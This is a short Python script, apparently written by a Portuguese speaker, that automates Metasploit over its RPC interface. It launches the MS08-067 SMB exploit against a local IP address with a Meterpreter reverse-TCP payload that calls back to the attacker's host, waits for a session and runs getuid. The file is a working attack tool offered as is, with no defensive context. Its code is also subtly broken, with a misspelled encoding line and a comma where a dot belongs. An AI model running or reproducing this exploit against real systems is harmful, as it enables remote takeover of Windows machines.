# -*- coding: uft-8 -*-
import time,msfrpc
client = msfrpc,msfrpc({})
client.login("msf", "pass_strong")
sessao = client.call("console.create")
comando = """use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.0.25
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.11
exploit
"""
client.call("console.write", [sessao["id"], comando])
time.sleep(1)
resultado = client.call("console.read", [ sessao["id"] ])
while True:
	if "Meterpreter session" in resultado["data"]:
		break
	elif "Exploit completed, but no session was created" in resultado["data"]:
		print "Falha na execução de exploit"
		client.call("console.destroy", [sessao["id"]])
		exit()
	else:
		resultado = client.call("console.read", [sessao["id"] ])
		time.sleep(1)
print resultado["data"]
client.call("console.write", [sessao["id"], "getuid" + "\n"])
time.sleep(1)
resultado = client.call("console.read", [ sessao["id"] ])
while resultado["data"] is None:
	resultado = client.call("console.read", [ sessao["id"] ])
	time.sleep(1)
print resultado["data"]
client.call("console.destroy", [sessao["id"]])
